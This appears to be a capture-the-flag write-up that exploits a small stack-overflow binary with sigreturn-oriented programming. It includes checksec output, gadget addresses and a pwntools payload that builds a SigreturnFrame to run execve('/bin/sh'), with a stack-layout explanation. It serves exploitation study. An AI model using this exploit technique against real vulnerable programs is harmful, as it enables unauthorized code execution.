# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
Arch:       amd64
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x42000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

As we can see, we can do something there!

The program has no interface, so we head into the disassembly right away.

### Disassembly

Starting with `_start()`:

![image](https://github.com/user-attachments/assets/38bc394c-4df5-4510-98a1-821a9ac64cb2)

![image](https://github.com/user-attachments/assets/f1b71c35-c417-4886-8d7d-c9c2c2ab5d9a)

That's the whole binary, we see there is a huge buffer overflow that `rdx` reads up to `0x106 = 262` bytes by read syscall. And we can modify return address if we send enough bytes to override. First of all, we need to find a possible gadget and `/bin/sh` address.

![image](https://github.com/user-attachments/assets/618d8c46-cbd1-4c37-987e-bf7fc383a72f)


Now that we have this, we can craft the `SROP` chain.
We want to execute system("/bin/sh") but in assembly language it is execve("/bin/sh", argument, env ) function.
![image](https://github.com/user-attachments/assets/b9f3ec88-7915-49f1-88b1-25aac79cd63e)

```python
# Srop
POP_RAX =0x0043018
SYSCALL_RET=0x043015
BINSH = 0x43238
```

After crafting the `frame`, we send the payload to trigger the vulnerability and get shell.

```python
payload = b'a'*0x8  # 8 bytes override for save rbp
payload += p64(POP_RAX)
payload += p64(0xf)  # syscall number for rt_sigreturn(), search for linux syscall table
payload += p64(SYSCALL_RET)

frame = SigreturnFrame()
frame.rax = 0x3b           # syscall number for execve() function, u can search linux syscall table
frame.rdi = BINSH          
frame.rsi = 0x0             
frame.rdx = 0x0 
frame.rip = SYSCALL_RET   

payload += bytes(frame)
```
# Why I created like this. We should know how the stack allocate data.

[filler | rop.rax[0] | 0xf | rop.syscall[0] | Sigreturn Frame]

When SYS_read reads the payload onto the stack (at RSP - 8), the stack looks like this:
```
RSP-8: "w3th4nds"
RSP: rop.rax[0]
RSP+8: 0xf
RSP+16: rop.syscall[0]
RSP+24: [Sigreturn Frame]
```
The ret instruction jumps to the value at RSP now is RAX

Gadget pop rax; ret:
pop rax: Get 0xf from RSP+8 and allocate it to RAX.

ret: Skip to rop.syscall[0] at RSP+16.

The syscall gadget (at rop.syscall[0]) calls SYS_rt_sigreturn because RAX = 0xf now.
Why is this needed?

SYS_rt_sigreturn requires RAX = 0xf and needs a way to put this value into RAX. The pop rax utility; ret is the only tool in the program that is allowed to do that.
After RAX = 0xf, we need to call the syscall to execute. So this ROP string is the "start" step to move to the next stage.

Thinking: The ROP chain is like a "bridge" from the initial state of the program (after SYS_read) to the SROP mechanism.
# Sigreturn Frame Section - "Execute the final goal"

Goal: Provide a frame signal to the kernel to read when SYS_rt_sigreturn is called, from which registers are set to call execve("/bin/sh", NULL, NULL).

When SYS_rt_sigreturn is called (from the utility syscall in stage 1), the kernel checks the stack at location RSP for the Sigreturn Frame.

At this point, RSP points to RSP+24 (byte(frame) section), which contains the values:
RAX = 0x3b (execve syscall number).
RDI = binsh (pointer to /bin/sh).
RSI = 0x0 (NULL).
RDX = 0x0 (NULL).
RIP = rop.syscall[0] (return utility syscall).

The kernel "restores" these registers and jumps to rop.syscall[0].
The utility syscall is called again, but now RAX = 0x3b, so it executes execve("/bin/sh", NULL, NULL).

Why is this part needed?
SYS_rt_sigreturn doesn't know that we want to call execve. We have to provide a frame signal to "tell" the kernel: "Set the registers like this and jump here".

This is the only way to control multiple registers at once (RAX, RDI, RSI, RDX, RIP) without needing a longer ROP chain (which is hard to find in a small binary like this).

Running solver remotely at IP port

### Result


![image](https://github.com/user-attachments/assets/1cfc6b67-e5b1-42c0-8116-027ec9c7467d)

